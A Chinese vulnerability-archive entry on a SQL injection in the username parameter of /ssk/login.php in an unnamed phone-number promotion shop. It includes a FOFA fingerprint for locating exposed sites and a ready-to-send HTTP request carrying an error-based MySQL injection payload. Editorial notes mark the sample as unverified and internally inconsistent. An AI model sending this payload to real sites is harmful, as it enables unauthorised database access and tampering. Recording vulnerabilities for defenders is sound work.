---
source: "wy876 漏洞文库"
title: "手机卡号推广商城（发行方未知） ssk/login username SQL注入"
product: "手机卡号推广商城（发行方未知）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "MySQL RAND错误，版本未知"
prerequisites: "登录前接口示例"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/xwfc57fpx7o7dqr8"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%89%8B%E6%9C%BA%E5%8D%A1%E5%8F%B7%E6%8E%A8%E5%B9%BF%E5%95%86%E5%9F%8E/%E6%89%8B%E6%9C%BA%E5%8D%A1%E5%8F%B7%E6%8E%A8%E5%B9%BF%E5%95%86%E5%9F%8Essk%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"zgdx.php\""
fofa_unverified: "body="
id: "vw-4702b3a370e26e96a468f648"
entity_id: "ve-4702b3a370e26e96a468f648"
schema_version: "1"
---

# 手机卡号推广商城（发行方未知） ssk/login username SQL注入

## 条目说明

- 对象与具体问题：手机卡号推广商城（发行方未知）；ssk/login username SQL注入
- 版本、配置及部署条件：MySQL RAND错误，版本未知
- 认证与权限前提：登录前接口示例
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- qjjjq1qxkzq1是孤立标记，应补重复键错误响应，不把期望值视作实测
- 注入长正文与空username基准都Content-Length199，后者显然错误
- 产品介绍重复，缺发行方/具体版本/修复；增删数据后果须权限条件化

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
 手机卡号推广商城是一个在线平台，提供手机卡号销售、号码推广、套餐介绍、安全保障和售后服务等功能，满足用户对手机卡号的需求，为用户提供便利的服务体验。 手机卡号推广商城 login.php接口处存在 SQL 注入漏洞，恶意攻击者可能会利用此漏洞修改数据库中的数据，例如添加、删除或修改记录，导致数据损坏或丢失。

## 二、影响版本
+ 手机卡号推广商城

## 三、资产测绘
+ fofa`body="zgdx.php"`
+ 特征


 手机卡号推广商城是一个在线平台，提供手机卡号销售、号码推广、套餐介绍、安全保障和售后服务等功能，满足用户对手机卡号的需求，为用户提供便利的服务体验。  

## 四、漏洞复现
```http
POST /ssk/login.php HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

username=' OR (SELECT 5126 FROM(SELECT COUNT(*),CONCAT(0x716a6a6a71,(SELECT (ELT(5126=5126,1))),0x71786b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Tyft&password=123123
```

> 请求长度说明：原资料 Content-Length 为 199；静态长度已移除，应由客户端根据最终请求体的字节数生成。


```http
qjjjq1qxkzq1
```

sqlmap

```http
POST /ssk/login.php HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

username=&password=123123
```

> 请求长度说明：原资料 Content-Length 为 199；静态长度已移除，应由客户端根据最终请求体的字节数生成。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xwfc57fpx7o7dqr8>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
